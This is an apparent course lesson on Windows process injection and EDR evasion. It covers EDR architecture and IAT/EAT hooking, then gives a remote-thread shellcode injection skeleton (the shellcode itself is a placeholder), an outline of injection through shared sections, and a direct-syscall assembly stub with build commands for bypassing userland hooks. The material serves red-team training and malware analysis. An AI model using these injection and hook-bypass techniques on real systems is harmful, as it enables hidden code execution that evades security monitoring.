---
title: "Windows Injection and Hijacking"
topic: "windows-injection-hijacking"
tags: [windows, injection, hijacking, edr, iat, eat, dll-injection, syscalls, naked-function]
difficulty: advanced
day: 78
layout: default
parent: Topics
nav_order: 78
---

# Windows Injection and Hijacking

## What You Will Learn
- How EDR (Endpoint Detection and Response) works at an architectural level
- What the IAT and EAT are and how they are used for hooking
- How to perform thread injection into a remote process
- How to bypass EDR API hooks using direct syscalls

## What Is It?

Windows injection and hijacking refers to techniques for injecting code into other processes and bypassing security monitoring. These techniques are used by both malware and red team tools to evade detection.

## Why It Matters

Modern EDRs hook Windows API functions to monitor behavior. Understanding how they work — and how to bypass them — is essential for red team operations and malware analysis.

## EDR Architecture

An EDR operates at three layers:

| Layer | Description |
|-------|-------------|
| **Sensor (Userland)** | Collects telemetry and monitors behavior — hooks API calls |
| **Driver (Kernel)** | Monitors low-level operations — process creation, file access |
| **Backend (Online)** | Receives telemetry for processing, logging, and analysis |

## Key Terms

| Term | Description |
|------|-------------|
| **API calls** | High-level function calls provided by Windows libraries (e.g., `CreateFile`) |
| **System calls** | Low-level interface between userland and kernel space |

### Windows Native API Prefixes

| Prefix | Layer | Description |
|--------|-------|-------------|
| `Nt` | Userland | Native API — userland wrapper for syscalls |
| `Zw` | Kernel | Kernel-mode Native API — may skip user-mode checks |
| `Ex` | Kernel | Executive layer — core helper functions |
| `Cm` | Kernel | Configuration manager — registry interaction |

## Import and Export Address Tables

### IAT (Import Address Table)

The IAT stores addresses of functions imported from external DLLs. When a program calls `CreateFile`, the actual address comes from the IAT. EDRs hook functions by **overwriting IAT entries** to point to their own code.

### EAT (Export Address Table)

The EAT exposes functions from a DLL for external use. EDRs can also hook by patching the EAT or by inline-hooking (overwriting the first bytes of the function with a jump).

## Windows API for Injection

```cpp
OpenProcess()         // Open handle to target process
VirtualAllocEx()      // Allocate memory in remote process
WriteProcessMemory()  // Write data to remote process memory
CreateRemoteThread()  // Execute code in remote process
```

## Thread Injection — Example

```cpp
#include <windows.h>

int main() {
    HANDLE hProcess, hThread;
    LPVOID start_ptr;
    DWORD tid;
    size_t written;

    char shellcode[] = { /* your shellcode here */ };
    start_ptr = (LPVOID)0x13370000;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 2676); // PID 2676

    start_ptr = VirtualAllocEx(hProcess, start_ptr, 0x1000,
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(hProcess, start_ptr, shellcode, sizeof(shellcode), &written);

    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)start_ptr,
                                 NULL, 0, &tid);
    return 0;
}
```

## Injection Without VirtualAlloc

Instead of `VirtualAllocEx`, create a shared memory section and map it into both processes:

```
NtCreateSection       // Create shared memory section
NtMapViewOfSection    // Map it into local process
NtMapViewOfSection    // Map it into remote process
// Write payload to local mapping → it appears in remote process too
```

Find writable memory in the target, place `LoadLibrary`, and call `CreateRemoteThread` with the DLL path as the argument.

## Bypassing EDR API Hooking

EDRs hook `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, etc. in userland. To bypass them, call the kernel directly using **direct syscalls**.

### Setting Up a Syscall (Naked Function)

Windows moves the first argument from `rcx` to `r10` before a syscall (because `rcx` stores the return address in the kernel calling convention).

```asm
; syscall.asm
.code
public MyNakedFunction

MyNakedFunction proc
    mov r10, rcx        ; Windows x64 ABI: move first arg to r10 for kernel
    mov eax, 0C4h       ; syscall number (NtAllocateVirtualMemory example)
    syscall
    ret
MyNakedFunction endp

end
```

Assemble:

```cmd
ml64 /c /Fo syscall.obj syscall.asm
```

In your C++ file:

```cpp
extern "C" NTSTATUS MyNakedFunction(HANDLE *);
```

Compile:

```cmd
cl /O2 windows.cpp syscall.obj
```

## Resources

- [Elastic — Ten Process Injection Techniques](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
- [ired.team — Windows API Injection](https://www.ired.team/offensive-security/code-injection-process-injection)
- [SysWhispers — Syscall Generation Tool](https://github.com/jthuraisamy/SysWhispers)
- [MalDev Academy](https://maldevacademy.com/)
- [HackTricks — Windows Injection](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
